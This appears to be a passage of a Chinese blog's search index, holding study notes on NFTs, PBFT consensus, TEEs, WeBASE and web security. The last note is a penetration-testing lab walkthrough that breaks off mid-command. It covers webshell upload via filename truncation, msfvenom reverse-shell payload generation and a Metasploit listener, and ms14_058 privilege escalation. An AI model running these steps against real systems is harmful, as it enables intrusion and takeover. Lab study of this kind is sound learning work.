\n削弱传统中介（如唱片公司、画廊）的垄断。\n\n\n客户关系：NFT作为品牌与用户的数字化纽带（如星巴克NFT增强用户粘性）,同时可以促进客户关系，使品牌方知晓相互品牌和客户间的联系。\n\n2.2 应用场景​\t分类：艺术作品 音乐 小说 游戏资产 视频 票务 保险&#x2F;发票 订单&#x2F;契约 图片 元字宙土地 域名…… \n\nGameFi：游戏资产NFT化（如Axie Infinity的宠物）。  \n生态与服务：艺术创作者&#x2F;交易平台&#x2F;基础设施&#x2F;NFT-Fi&#x2F;工具&#x2F;应用&#x2F;DAO&#x2F;媒体  \n艺术创作类型：文学、图片、音乐、视频、运动\n\n3. NFT生态NFT-Fi\nLeverage 资产-如何不断提升资本利用效率\n-抵押借贷&#x2F;租赁\n- Buy Now Pay Later\n-碎片化\n-众筹\n-NFT Stake（质押NFT资产 提升资金利用效率）\n基础设施\n公链、存储、安全\n应用\n钱包、PFP、Social·Fi、GameFi、手机壳\n工具\nNFT数誉分析、NFT社区管理工具、营销平台、NFT定价\n2022年顶级NFT系列（交易额）\nBored Ape Yacht Club - 15.7亿美元  \nOtherside - 11.4亿美元  \nMutant Ape Yacht Club - 11亿美元  \nAzuki - 8.499亿美元  \nCryptoPunks - 7.06亿美元  \nClonoX-6.150 亿美元\nMoonbirds-6.134 亿美元\nMeebits -5.752 亿美元\nDoodles -3.916 亿美元\nBored Ape Kennel Club -1.4 亿美元\n注：Yuga Labs占据Top 10中的5席（如BAYC、CryptoPunks 1 3 5 8 10）\n\n\n\n4.  NFT价值锚定与动机购买动机\n金融投资：杠杆化资产（如ETH牛市中的NFT增值）。  \n情绪价值：  \n社群身份（如KOL地位）。  \n炫耀性消费（如高价PFP头像）。\n\n\n\n价值支撑\n稀缺性：限量发行（如CryptoPunks的10,000个）。  \n实用性：GameFi道具、元宇宙通行证。\n\n6. 未来机遇与挑战机遇\n传统行业入场：Web2品牌（如Nike、星巴克）发行NFT。  \n金融创新：  \nNFT质押（Stake）、ETF、永续合约。  \n提高流动性（如AMM机制、碎片化）。\n\n\n\n挑战\n市场渗透率：大众接受度仍需培养。  \n监管风险：版权与金融合规问题。\n\n7. 关键概念补充\nTreasury：DAO或项目的资金池，用于生态发展。  \nMetaverse：虚拟世界（如Decentraland），NFT代表土地或物品。  \nNFT Stake：质押NFT获取收益（类似DeFi质押）。  \nNFT ETF：追踪一篮子NFT价值的基金，降低投资门槛。\n\n8. NFT 流动性-如何提高交易深度NFT 相关金融衍生品及交易机制解析1. 二级买卖（做多+做空）\n做多（Buy Long）：投资者买入NFT，预期其价格上涨后卖出获利。\n做空（Sell Short）：通过借贷平台（如NFTfi）借入NFT并立即卖出，等价格下跌后买回归还，赚取差价。\n与NFT的关系：\n传统NFT交易仅限于现货买卖，做空机制引入了对冲和套利策略。\n依赖借贷协议或衍生品市场实现双向交易。\n\n\n\n\n2. NFT ETF\n定义：追踪一篮子NFT（如蓝筹PFP、虚拟土地）价格的指数基金，通过代币化份额（ERC-20）降低投资门槛。\n与NFT的关系：\n解决NFT流动性差的问题，散户可小额投资多个NFT资产。\n例如：NFTX 提供基于BAYC、CryptoPunks的指数基金。\n\n\n\n\n3. NFT Perp永续合约\n定义：以NFT指数价格为标的的永续合约（如BAYC地板价），支持杠杆交易（做多&#x2F;做空）。\n与NFT的关系：\n无需持有实物NFT即可交易其价格波动（如Blur的借贷池衍生品）。\n风险：依赖预言机喂价，可能因流动性不足被操纵。\n\n\n\n\n4. AMM（自动化做市商）\nNFT-AMM模型：\n碎片化AMM：将NFT拆分为ERC-20代币（如Fractional），在Uniswap等DEX交易。\n流动性池：用户质押NFT或代币提供流动性（如SudoSwap的链上订单簿）。\n\n\n与NFT的关系：\n提升NFT流动性，实现即时买卖。\n缺点：可能稀释NFT独特性（如碎片化后失去所有权）。\n\n\n\n\n5. ERC-721P（可编程NFT标准）\n特点：在ERC-721基础上嵌入金融逻辑，例如：\n自动分红（NFT持有者分润项目收入）。\n动态属性（根据链上数据变化NFT元数据）。\n\n\n与NFT的关系：\n扩展NFT的金融化场景（如游戏资产生息）。\n案例：Chiru Labs（Azuki）探索ERC-721P的版税强制执行。\n\n\n\n\n\n\n概念\n核心功能\n对NFT生态的影响\n\n\n\n二级买卖（多空）\n双向交易、对冲风险\n引入传统金融策略，提高市场效率\n\n\nNFT ETF\n代币化指数投资\n降低散户参与门槛，增强流动性\n\n\nNFT Perp\n杠杆交易价格波动\n投机工具，但依赖预言机可靠性\n\n\nAMM\n碎片化&#x2F;流动性池交易\n解决流动性问题，可能牺牲独特性\n\n\nERC-721P\n可编程金融逻辑\n推动NFT从收藏品转向实用化资产\n\n\n应用场景：\n\n投资者：利用Perp&#x2F;ETF对冲或杠杆化NFT投资。\n项目方：通过ERC-721P设计经济模型（如版税自动化）。\n交易平台：采用AMM降低买卖滑点（如OpenSea Pro的链上聚合）。\n\n","url":"2025/03/29/NFT/","date":"2025-03-29"},{"title":"PBFT共识算法","content":"PBFT共识算法PBFT算法概述定义与介绍定义Practical Byzantine Fault Tolerance（PBFT）是一种用于分布式计算和分布式系统中的共识算法，旨在解决拜占庭容错问题。（拜占庭容错问题涉及到在分布式系统中存在故障或恶意节点的情况下，如何确保系统能够维持一致性）。\n介绍PBFT是一种状态机副本复制算法，即服务作为状态机进行建模，状态机在分布式系统的不同节点进行副本复制。每个状态机的副本都保存了服务的状态，同时也实现了服务的操作。将所有的副本组成的集合使用大写字母R表示，使用0到|R|-1的整数表示每一个副本。为了描述方便，假设|R|&#x3D;3f+1，这里f是有可能失效的副本的最大个数。尽管可以存在多于3f+1个副本，但是额外的副本除了降低性能之外不能提高可靠性。\nPBFT算法中节点只有两种角色，主节点（primary）和副本（replica），两种角色之间可以相互转换。两者之间的转换又引入了视图（view）的概念，视图在PBFT算法中起到逻辑时钟的作用。\n  \n特点与工作原理特点\n拜占庭容错： PBFT旨在解决拜占庭容错问题，这意味着系统可以继续正常运行，即使有一些节点是恶意的或出现了故障。\n节点投票： 在PBFT中，网络中的节点会相互交流以达成共识。每个节点会对提出的交易或区块进行投票，表达自己的意见。\n三阶段协议： PBFT采用了一种三阶段的协议，包括预备（pre-prepare）、准备（prepare）和提交（commit）阶段。在每个阶段，节点都会按照协议的规则发送消息，以便其他节点验证并最终达成共识。\n多数原则： PBFT要求绝大多数节点达成一致意见，才能够执行交易或添加区块。这有助于防止恶意节点或错误导致的不一致性。\n较高性能： PBFT通常具有较高的性能，因为节点之间的通信和共识是快速的，不需要执行复杂的计算难题（如PoW）。\n可扩展性： 尽管PBFT对于确保一致性非常有效，但它的可扩展性在大型网络中可能受到限制。\n\n工作原理 其核心工作原理是在存在拜占庭错误的情况下，通过多个节点协作完成共识，保证系统的一致性和可靠性。\n具体：\n1. 请求阶段（Request）\n客户端（Client）向主节点发送请求，内容包括操作类型和参数。\n请求格式为：&lt;请求ID, 操作, 客户端ID&gt;，通过消息认证机制确保其来源可信。\n\n\n2. 预准备阶段（Pre-Prepare）\n主节点接收到客户端请求后，为该请求分配序列号（Sequence Number）。\n主节点将请求与序列号组成的消息广播给所有备节点，格式为：&lt;视图号, 序列号, 请求内容&gt;。\n备节点验证：\n消息的完整性和合法性。\n主节点是否按照请求的顺序分配序列号。\n\n\n若验证通过，备节点记录该消息并进入下一阶段。\n\n\n3. 准备阶段（Prepare）\n每个备节点将自己接收到的 Pre-Prepare 消息广播给其他节点，形成 Prepare 消息。\n节点收到至少 2f+1条来自不同节点的 Prepare 消息（包括自身）后，确认该请求在网络中达成了一致性，记录状态并进入下一阶段。\n\n\n4. 提交阶段（Commit）\n每个节点将 Prepare 消息汇总并广播一个 Commit 消息。\n当一个节点收到至少 2f+1条 Commit消息后：\n确认请求已被网络中大多数节点接受。\n执行操作，并记录操作结果。\n\n\n\n\n5. 回复阶段（Reply）\n节点将执行结果发送给客户端。\n客户端接收到来自至少 f+1 个不同节点的相同回复后，确认操作成功完成。\n\n\nPBFT算法流程  在算法开始阶段，主节点由 p = v mod n计算得出，随着v的增长可以看到p不断变化。\n  首先客户端发送消息m给主节点p，主节点就开始了PBFT三阶段协议，其中pre-prepare和prepare阶段最重要的任务是保证同一个主节点发出的请求在同一个视图（view）中的顺序是一致的，prepare和commit阶段最重要的任务是保证请求在不同视图之间的顺序是一致的。\n\n主节点收到客户端发送来的消息后，构造pre-prepare消息结构体&lt; &lt;PRE-PREPARE, v, n, d&gt;, m &gt;广播到集群中的其它节点。\nPRE-PREPARE标识当前消息所处的协议阶段。\nv标识当前视图编号。\nn为主节点广播消息的一个唯一递增序号。\nd为m的消息摘要。\nm为客户端发来的消息。\n\n\n副本(backup)收到主节点请求后，会对消息进行检查，检查通过会存储在本节点。当节点收到2f+1（包括自己）个相同的消息后，会进入PREPARE状态，广播消息&lt; &lt;PREPARA, v, n, d, i&gt; &gt;，其中i是本节点的编号。对消息的有效性有如下检查：\n检查收到的消息体中摘要d，是否和自己对m生成的摘要一致，确保消息的完整性。\n检查v是否和当前视图v一致。\n检查序号n是否在水线h和H之间，避免快速消耗可用序号。\n检查之前是否接收过相同序号n和v，但是不同摘要d的消息。\n\n\n副本收到2f+1（包括自己）个一致的PREPARE消息后，会进入COMMIT阶段，并且广播消息&lt; COMMIT, v, n, D(m), i &gt;给集群中的其它节点。在收到PREPARE消息后，副本同样也会对消息进行有效性检查，检查的内容是上文1, 2, 3。\n副本收到2f+1（包括自己）个一致的COMMIT个消息后执行m中包含的操作，其中，如果有多个m则按照序号n从小到大执行，执行完毕后发送执行成功的消息给客户端。\n\n算法的流程图：\n\nPbft算法的时间复杂度？A：Pbft算法的时间复杂度O(n^2)，在prepare和commit阶段会将消息广播两次，一般而言，Pbft集群中的节点都不会超过100。\nPBFT 算法的优势与挑战优势适用场景PBFT是一种可行的共识算法，特别适用于需要高度安全性和快速共识的场景，例如金融领域或联盟区块链。\n较高容错性为了更多的容错性，PBFT算法最大的容错节点数量( n - 1 ) / 3，也就是是说4个节点的集群最多只能容忍一个节点作恶或者故障。\n保证集群的可用性&amp;稳定性\n具有视图切换（View-Change）机制。\n\nview-change提供了一种当主节点宕机以后依然可以保证集群可用性的机制。view-change通过计时器来进行切换，避免副本长时间的等待请求。当副本收到请求时，就启动一个计时器，如果这个时候刚好有定时器在运行就重置（reset）定时器，但是主节点宕机的时候，副本i就会在当前视图v中超时，这个时候副本i就会触发view-change的操作，将视图切换为v+1。\n\n副本i会停止接收除了checkpoint,view-change和new view-change以外的请求，同时广播消息\n1&lt;VIEW-CHANGE, v+1, n, C, P, i&gt;\n\n的消息到集群。\n\nn是节点i知道的最后一个stable checkpoint的消息序号。\nC是节点i保存的经过2f+1个节点确认stable checkpoint消息的集合。\nP是一个保存了n之后所有已经达到prepared状态消息的集合。\n\n\n当在视图( v+1 )中的主节点p1接收到2f个有效的将视图变更为v+1的消息以后，p1就会广播一条消息\n1&lt;NEW-VIEW, v+1, V, Q&gt;\n\n\nV是p1收到的，包括自己发送的view-change的消息集合。\nQ是PRE-PREPARE状态的消息集合，但是这个PRE-PREPARE消息是从PREPARE状态的消息转换过来的。\n\n\n从节点接收到NEW-VIEW消息后，校验签名，V和Q中的消息是否合法，验证通过，主节点和副本都 进入视图v+1。\n\n\n  当p1在接收到2f+1个VIEW-CHANGE消息以后，可以确定stable checkpoint之前的消息在视图切换的过程中不会丢，但是当前检查点之后，下一个检查点之前的已经PREPARE可能会被丢弃，在视图切换到v+1后，Pbft会把旧视图中已经PREPARE的消息变为PRE-PREPARE然后新广播。\n\n如果集合P为空，广播&lt;PRE-PREPARE, v+1, n, null&gt;，接收节点就什么也不做。\n如果集合P不为空，广播&lt;PRE-PREPARE, v+1, n,d&gt;\n\n  总结一下，在view-change中最为重要的就是C，P，Q三个消息的集合，C确保了视图变更的时候，stable checkpoint之前的状态安全。P确保了视图变更前，已经PREPARE的消息的安全。Q确保了视图变更后P集合中的消息安全。回想一下pre-prepare和prepare阶段最重要的任务是保证，同一个主节点发出的请求在同一个视图（view）中的顺序是一致的，而在视图切换过程中的C，P，Q三个集合就是解决这个问题的。\n\n视图协商（NegotiateView）机制\n\n集群在运行过程中，可能出现网络抖动、磁盘故障等原因，会导致部分节点的执行速度落后大多数节点，在Pbft中采用了视图协商（NegotiateView）的机制来保持同步。\n当一个节点多次view-change失败就触发NegotiateView同步集群数据，流程如下：\n\n\n新增节点Replica 4发起NegotiateView消息给其他节点；\n其余节点收到消息以后，返回自己的视图信息，节点ID，节点总数N；\nReplica 4收到2f+1个相同的消息后，如果quorum个视图编号和自己不同，则同步view和N；\nReplica 4同步完视图后，发送RevoeryToCheckpoint的消息，其中包含自身的checkpoint信息；\n其余节点收到RevoeryToCheckpoint后将自身最新的检查点信息返回给Replica 4;\nReplica 4收到quorum个消息后，更新自己的检查点到最新，更新完成以后向正常节点索要pset、qset和cset的信息（即PBFT算法中pre-prepare阶段、prepare阶段和commit阶段的数据）同步至全网最新状态；\n\n遵循线性一致性（ linearizability ）（线性一致性的解释：就是在并发编程里，我们进行了一番操作，得到了一个结果。然后这个操作的运行记录，和按照串行顺序一步步来的运行记录相一致，我们就能称其为「线性一致的（linearizable）」）。\n挑战PBFT的实现可能相对复杂，且在大规模网络中可能面临一些挑战。\nPBFT算法假设的环境比Raft算法更加的’恶劣‘，Raft算法只支持容错故障节点，而PBFT算法除了需要支持容错故障节点之外，还需要容忍作恶节点（作恶节点节点是指可能对接收到的消息作出截然相反的回复，甚至伪造消息）。\nPBFT算法的实现与优化与传统的Proof of Work（PoW）和Proof of Stake（PoS）等共识算法不同，PBFT通常用于私有或联盟区块链网络，其中节点的身份已知，且相互信任。其和 Raft算法解决的核心问题都是在分布式环境下如何保持集群状态的一致性，简而言之就是一组服务，给定一组操作，最后得到一致的结果。\n实现代码实现：\nhttps://github.com/CyHsiung/Practical-Byzantine-Fault-Tolerance-PBFT-\n\n联盟链\n\nPBFT 是联盟链的常用共识算法，因为它对节点的数量和参与身份有一定限制，适合权限网络。\n\nHyperledger Fabric：PBFT 早期被作为 Hyperledger 的共识候选。\nTendermint：基于 PBFT 的一种区块链共识实现，注重高性能和低延迟。\n\n\n分布式数据库\n\n\n在需要高容错性的分布式数据库中，PBFT 可用于确保数据一致性和可用性。\n\n\n金融系统\n\n\n金融机构常部署 PBFT 来防范节点作恶，从而在跨机构交易或清算网络中提供高安全性。\n\n\n物联网（IoT）\n\n\n在边缘计算场景，PBFT 被用于提高节点协作的一致性，增强系统的鲁棒性。\n\n优化：原始 PBFT 的消息复杂度为 O(n2))，针对该问题，以下优化措施被提出：\n\n分批处理\n将节点分为共识节点和候选节点。通过优化一致性协议，以减少共识过程中节点的通信量\n\n使用消息认证码（MAC）\n在正常运行时，使用 MAC 替代公钥加密进行节点身份验证，显著提高效率。\n\n快速路径优化\n在无故障情况下，跳过某些冗余通信步骤，进一步加快请求处理速度。\n\n\n总结PBFT 算法作为分布式共识的基础，推动了区块链和容错技术的发展。随着优化技术的进一步提升，它在金融、物联网和云计算等领域的应用潜力将更加广阔。\n参考线性一致性解释参考论文：https://cs.brown.edu/~mph/HerlihyW90/p463-herlihy.pdf\n全篇参考论文：www.scs.stanford.edu/nyu/03sp/sched/bfs.pdf\n优化参考：优化PBFT算法实现https://github.com/fangvv/SPBFT\n","url":"2024/12/16/PBFT共识算法/","date":"2024-12-16"},{"title":"TEE的初步理解与认识","content":"【论文阅读摘要】\n关键词：可信执行环境  \n定义可信执行环境（trusted execution environment, TEE）技术，用于保护非可信平台中应用和数据可信 执行. TEE 通常采用隔离部分软硬件资源的方法构 建安全区域，确保在其中运行的程序和数据保密性 和完整性不受外部干扰。\n一个可靠的TEE 需要提供 4 方面的安全保障\n1）数据隔离：一个可信应用使用的数据不能被其他应用访问、修改，包括可信应用的数据对外部操作系统隔离以及多个可信应用之间的数据隔离.。\n2）计算隔离：可信应用的计算资源不能被其他应用观测和拦截，同时需要清理可信应用执行后的痕迹，并防御来自侧信道的攻击。\n3）通信控制：非可信应用和可信应用、多个可信应用之间的会话和数据交互不能破坏隔离性.\n4） 错误隔离：非可信区域的安 全漏洞不能扩散到可信应用中.\n实用的 TEE 设计思路是基于硬件隔离基础，通过数据加解密和特权指令执行实现其安 全服务.\n特点现有的 TEE 技术具有 3 个明显特点\n1）面向用户设计\n2）硬件辅助支持设计：从基于 x86 到 RISC-V 架 构的平台均引入了新硬件特性\n3）共享资源：虽然在设计 TEE 的过程中引入了 新的加解密引擎、协处理器等. 但TEE仍然复用主处 理器和内存单元，与不可信系统的数据交互保持便捷性\n然而现有的 TEE 技术均存在不同程度的缺陷：\n\n安全攻击. 由于 TEE 技术和操作系统并非完全的隔离，如共用处理器、内存、缓存等，导致TEE 容易面临来自共享资源的侧信道攻击. \n性能影响. TEE 中数据保护普遍采用内存加密的方式防止数据泄露，即使通过硬件电路支持加 解密操作，其数据访问效率仍然低于明文计算. \n服务便捷性. 早期 TEE中部署的简化操作系 统所提供的服务有限且由服务商定制，难以部署大型应用. TEE 面向用户设计后，用户可以在应用层实现关键代码的安全执行，但对于系统资源的调用仍 然需要非可信系统的支持. 目前在推出安全虚拟化 的 TEE 技术后，用户安全应用领域将进一步发展.\n\n代表性设计当前主流计算机系统架构包括 x86，Arm 等均在 其设备平台中部署TEE 技术，代表性设计包括软件 保护拓展 Intel SGX  和 Arm TrustZone。\n其中 SGX 通过内存隔离和加密，以及拓展的指令集在用户空间提供 TEE，实现不同程序间的隔离运行，保证用户关键代码和数据的机密性和完整性不受恶意软件的破坏. \n而 TrustZone 则是通过设计处理器不同的处理模 式，结合隔离内存等软硬件资源，将系统划分为安全和非安全 2 个世界. 因此服务提供商通过在安全世界 中部署独立于用户操作系统的可信应用，为用户提供身份认证和授权服务. \n基于x86架构的TEE\n主要面向家用、商用服务领域。\n\n优点在于高性能以及强兼容性\n\n目前主要以 Intel，AMD 厂商为代表推动 x86 架构的发展\n\nx86 TEE是基于物理隔离方法和加密验证技术 构建的. \n\n可信平台技术：\n\n目前设备中普遍部署TPM2.0 版本\n（TPM: TPM 作为一种集成到芯片组中的微控制器，主要用 于密钥生成、存储和证书验证，同时保存系统各层次模块的测量值. TPM 基于硬件的密码学特点可以保证存储数据免受外部恶意软件的攻击，因此是广泛应用于系统启动和应用部署的安全策略的基础 ）\n\n\n\n\n\n\n基于协处理器的可信子系统\n\n\nME,Intel 管理引擎\n\nME 子系统拥有独立的计算能力和内存空间,因此在 Intel 架构安全体系中 作为基础可信域存在\n\nME 子系统拥有独立的物理地址和 IP 地址，通 过直接连接网卡访问远程资源，因此管理端可以通 过 ME 子系统远程透明地管理设备开关机、主系统 启动验证、设备温度、电压等物理特征检测，甚至对主系统运行时状态监控.\n\n\n\nPSP，AMD平台安全处理器\n\n\n\n\n基于处理器模式的可信系统\n\n背景: 针对协处理器和主处理器之间的隔离性，ME 和 PSP 子系统只能管控平台设备的物理属性，因此子系统难以同步获取和验证主系统状态，也不能操控主系统的正常运行\n基于主 CPU 的不同执行模式构建的TEE则能有效控制主系统. Intel 和 AMD 平台利用系统管理模式 SMM 部署了可信服务代码。\n基于 SMM 计算模式以及内存区域的隔离性，设备制造商（OEM）可以在设备出厂前部署管理需求的任务，如 CPU 电源管理、启动代码块验证、TPM 数据清理等一系列高权限的处理模块。\n\n\n基于内存加密的用户TEE\n\n​\t\t\tIntel 和 AMD 分别提出 Intel SGX 和 AMD SEV  技术. Intel SGX 为用户提供应用层 TEE。\n​\t\t\tAMD 为用户提供系统级的TEE，通过内存加密和虚拟化技术，直接构建面向用户的安全虚拟机系统. \n​\t\t\tAMD SEV 尤其适用于云环境下对租户提供安全计算平台的需求\nx86 TEE 面临的安全风险与挑战\nTEE 面临的主要安全风险来自于 2 个方面：内部软硬件设计漏洞和外部侧信道攻击. \n软硬件设计漏 洞问题包括控制逻辑代码缺陷、接口设计不严谨等，\n\n针对隔离机制的攻击\n基于共享资源的侧信道攻击\n基于硬件设计漏洞的攻击\n\n基于 Arm 架构的 TEE基于 RISC-V 架构的 TEE异构计算单元的 TEE","url":"2025/01/11/TEE的初步理解与认识/","date":"2025-01-11"},{"title":"WeBASE相关","content":"WEBASE介绍引入：\n中间件（Middleware），是提供系统软件（这里指控制硬件的软件，多指操作系统）和应用软件之间连接的软件，以便于软件各部件之间的沟通，特别是应用软件对于系统软件的集中的逻辑，在现代信息技术应用框架如Web服务、面向服务的体系结构等中应用比较广泛。\n(举例： 房屋中介 耦合 )\n定义WeBASE（WeBank Blockchain Application Software Extension）是在区块链应用和FISCO-BCOS节点之间搭建的一套通用组件。围绕交易、合约、密钥管理，数据，可视化管理来设计各个模块，开发者可以根据业务所需，选择子系统进行部署。\nWeBASE屏蔽了区块链底层的复杂度，降低开发者的门槛，大幅提高区块链应用的开发效率，包含节点前置、节点管理、交易链路，数据导出，Web管理平台等子系统。\n整体架构\n\n【图片3】\nWeBASE-FrontWeBASE-Front 是一个与 FISCO-BCOS 节点配合使用的子系统，主要特点如下：\n\n版本支持：支持 FISCO-BCOS 2.0 及以上版本。\n集成功能：集成 web3sdk，封装接口，可通过 HTTP 请求与节点通信。\n可视化控制台：提供控制台用于开发智能合约、部署合约、发送交易，并查看交易和区块详情。\n私钥管理：支持管理私钥。\n节点监控：可监控和统计节点健康度。\n\n部署参考：\n https://webasedoc.readthedocs.io/zh_CN/latest/docs/WeBASE-Front/install.html\n\n部署要求：需要与节点同机部署。\n\n功能定位：作为 WeBASE 管理平台的前置节点服务。\n\n核心功能：\n\n\n\n提供可视化控制台。\n支持智能合约开发、部署和交易发送。\n可查看交易和区块详情。\n\n\n管理功能：\n\n\n管理私钥。\n监控和统计节点健康度。\n\n\n设计原则包括按需部署、微服务、零耦合以及可定制四个部分\n\nWEBASE管理平台各模块详细介绍\n区块链数据概览\n数据概览页面，展示了区块链的核心数据指标：节点个数，区块数量，交易数量，通过管理台部署的合约数量。关键监控指标：最近有交易的7天交易量。\n\n节点信息列表：展示了节点的ID，节点块高，节点view和运行状态。区块信息展示了最近5个块的概览信息，点击更多可以查看更多历史区块。交易信息展示了最近5个交易的概览信息，点击更多可以查看更多历史交易。\n\n\n节点管理\n节点管理主要提供了前置列表和节点列表的功能。用户可以通过新增节点前置，把新的节点前置添加到前置列表。系统会默认拉取这些前置所在的群组和各个群组的节点信息。\n\n合约管理\n提供了一个图形化的合约IDE环境。\n\n私钥管理\n在私钥管理界面，可以看到合约部署和交易调用功能。这里的私钥管理可以新建私钥用户，然后拿新建用户的私钥来做合约部署和合约交易的签名。\n\n系统监控系统监控主要包括节点监控和主机监控。节点监控主要有区块高度，pbftview，待打包交易。主机监控主要有主机的CPU，内存，网络和硬盘IO。\n交易审计辅助监管和审计链上的行为。\n\n交易审计就是结合上面的区块链数据，私钥管理和合约管理三者的数据，以区块链数据为原材料，以私钥管理和合约管理为依据做的一个综合性的数据分析功能。交易审计提供可视化的去中心化合约部署和交易监控、审计功能，方便识别链资源被滥用的情况，为联盟链治理提供依据。\n登陆账号管理WeBASE管理平台上的智能合约开发流程\n新建账户\n添加合约\n部署合约\n调用合约\n\n","url":"2025/02/25/Webase/","date":"2025-02-25"},{"title":"WEB安全","content":"如何实施安全评估：资产等级划分—威胁建模—风险分析—设计安全方案\n\n资产等级划分\n\n划分信任域\n  根据网络逻辑划分（信任程度：数据库&gt;web应用&gt;Internet）\n互联网安全核心——数据安全\n\n威胁建模\n\n找出威胁\n方法：STRIDE模型\n\n\n\n威胁\n定义\n对应安全属性\n\n\n\nSpoofing(伪装)\n冒充他人身份\n认证\n\n\nTampering（篡改）\n修改数据或代码\n完整性\n\n\nRepudiation（抵赖）\n否认做过的事情\n不可抵赖性\n\n\nInformation Disclosure(信息泄露)\n机密信息泄露\n机密性\n\n\nDenial of service(拒绝服务)\n拒绝服务\n可用性\n\n\nElevation of Privilege(提升权限)\n未经授权获得许可\n授权\n\n\n\n风险分析\n\n判断风险高低（风险&#x3D;可能性*潜在危害）\n 方法：DREAD模型\n\n设计安全方案\n\n安全是产品的属性\n优秀安全方案所具备特点：\n\n能够解决问题\n用户体验好\n高性能\n低耦合\n易于扩展与升级\n\n安全方案设计原则： 1.“默认安全原则”\na.    专家系统：黑名单&amp;白名单\n   （白名单-允许&#x2F;黑名单-不允许）\nb.    最小权限原则（不要过度授权）\nc.    “纵深防御”原则——类似圈层防御\nl 从不同层面、不同方面实施安全方案\n具有根本性，针对性\nd.    “数据与代码分离”原则\n这一原则适用于各种由于“注入”而引发安全问题的场景\nEg:将页面代码中将“”标签变成代码片段的一部分（对<>等符号进行处理）\ne.    “随机性”原则\n\n利用计算的单向（当逆推时，计算变得十分复杂）性，生成随机字符串，攻击者猜中的概率就很小，增加安全性。\n\n随机性（不可预测性）——提高篡改、伪造等攻击 的门槛\n\n注意计算机中采用的随机数一般是伪随机数\n\n\nHTTP协议与Web应用HTTP协议中与安全有关的知识\n http协议只能由客户端单向发起请求，服务端（一般为浏览器）再响应请求。\n​                               \n出于安全考虑，要遵循以下基本原则：\n\nGET和HEAD方法应当只用于对服务端没有副作用的操作（即“只读”操作）。对于GET请求，浏览器在刷新页面时不会要求用户确认，对于有副作用（即增加，删除，更改数据）的POST请求，在刷新界面时会询问用户是否要重新发送，避免多余操作（重复下单等）\n\nPUT和DELETE一般用于直接上传和删除文件（大部分不会用到，且若被攻击时很危险，无需求时应该禁用）\n\n尽量用POST提交敏感数据，用GET提交易造成数据的泄露。\n\n在服务端获取请求参数时，应当说清是从GET参数还是从POST参数请求\n\nTRACE方法通常用于诊断调试，服务端直接返回请求中的内容（生产环境的服务器应当禁用TRACE）\n\nCONNECT方法用于在客户端和目标地址之间建立一个TCP隧道，只有初始请求是HTTP协议，后续所有双向流量都是在TCP连接上传输的\n\n\nReferer头指示了当前请求是从哪个URL页面发起的（URL中一般不要包含敏感信息，可能造成信息泄露）\n关于HTTP响应：\n HTTP响应与请求是一一对应的，响应中版本号不一定要与请求中的版本号一样，但是其大版本号不能高于请求的大版本号，例如请求是HTTP/1.0版本的，服务器响应不能为HTTP/2但是可以为HTTP/1.1版本的\n对状态码：\n分析状态码可以实现简单的安全监测（Eg:一个访问者在短时间内产生大量404响应，很可能是有攻击者在做网站扫描探测；某页面有大量500响应，可能意味着程序存在BUG等或被攻击行为）\nHTTP的响应头是通过“\\r\\n”分割的\n\n\n\n\n","url":"2024/12/01/WEB安全/","date":"2024-12-01"},{"title":"【学习笔记】渗透测试过程1","content":"1. 设置网络环境\n将 Kali 虚拟机和靶机的网络适配器改为桥接模式。\n\n在 Kali 虚拟机和靶机相互 ping 通，确保网络连通性。\n\n切换到 root 模式进行操作。\n\nNmap（用于信息收集 资产探测：ip存活、系统、软件、软件版本、端口）\n\n扫描网段：\n1nmap -sn 192.168.42.0/24\n\n查看网段中存活的主机。\n\n\n\n全面扫描靶机：\n1nmap -A &lt;靶机IP&gt;\n\n在本实验获取数据库端口（1433）。\n\n\n判断系统类型：\n1nmap -O &lt;靶机IP&gt;\n\n在 running: 后面查看主机系统信息。\n\n【图片2】\n\n服务版本扫描(运行软件）：\n1nmap -sV &lt;靶机IP&gt;\n\n\n端口扫描：\n1nmap -p1-65535 (目标端口)&lt;靶机IP&gt;\n\n\n端口 27689 测试：扫描出异常(unknown）端口，在浏览器访问 &lt;靶机IP&gt;:27689。\n\n随机 IP 扫描：\n1nmap -v -iR(随机) &lt;数量&gt; -Pn -p 80\n\n如果对方开了防火墙——（报）filtered http\n\n\n\n3. 目录结构探测 - 使用 Dirsearch获取\n安装 Dirsearch，用于获取网站目录结构（取决于字典）：\n1dirsearch -u http://&lt;靶机IP&gt;:27689/ -I 200,302\n\n200 和 302 表示返回的状态码。\n\n\n\n逐步访问上述图片获取的文件，在浏览器输入 http://&lt;靶机IP&gt;:27689/&lt;文件名&gt;。\n\n在访问 web.config.bak 文件，得到数据库信息：\n\n数据库 IP：192.168.61.144\n数据库名称：FileManage\n用户名：down\n密码：downsql\n\n\n\n\n4. 数据库连接 - 使用 Navicat 连接\n下载并安装 Navicat，使用上述数据库信息进行登录。\n若连接不上，可以将 Navicat 通过 FTP 安装到虚拟机。\n\n\n5. 网站管理\n回到网站 &lt;靶机IP&gt;:27689，在用户管理模块进行操作。（登入——用户管理——管理用户）\n\n\n6. 上传一句话木马\n生成一句话木马文件，在网站下载管理模块上传文件：\n文件命名为 aaaaaaaaa.aspx.jpg（利用文件名过长被截断的特性，上传后网站删除.jpg）。\n\n\n \n  上传成功后，一访问就下载：无法解析函数\n\n\n获取文件绝对路径：通过访问不存在的文件查看报错，找到路径 /upfile/affix/。\n\n\n\n7. 连接木马\n使用蚁剑连接上传的 aspx 文件。\n\n\n8. 生成并上传 MSF 木马\n生成 MSF 木马：\n1msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;靶机IP&gt; LPORT=6666 -f exe -o 123.exe\n\nIP 是 Kali 虚拟机的 IP 地址。\n\n\n\n启动监听器：\n123456msfconsoleuse exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset LHOST &lt;靶机IP&gt;set LPORT 6666run\n\n\n\n 将木马的exe文件从kali复制到主机，然后上传到蚁剑对应位置\n\n（进入&#x2F;web&#x2F;upfile&#x2F;affix&#x2F;，右键上传）\n\n\n\n启动木马文件：\n\n右键⽊⻢⽂件，打开终端 输⼊如下命令 \n\n1dir 123.exe\n\n\n如果成功，Kali 会成功上线（回到kali终端查看）。\n\n\n\n发现kali成功上线后 可查看到run的执⾏结果（如下图） \n\n\n\n它⾃动的为我们匹配出了⼀些可能的⽤于易受攻击⽬标提权的漏洞利⽤模块\n\n\n\n9. 提权操作\n使用以下命令检查提权模块：\n12bgsessions\n\n\n提权操作：\n123use multi/recon/local_exploit_suggesterset session 1run\n\n\n\n搜索并利用提权漏洞：\n1234search ms14_058use exploit/windows/local/ms14_058_track_popup_menuset 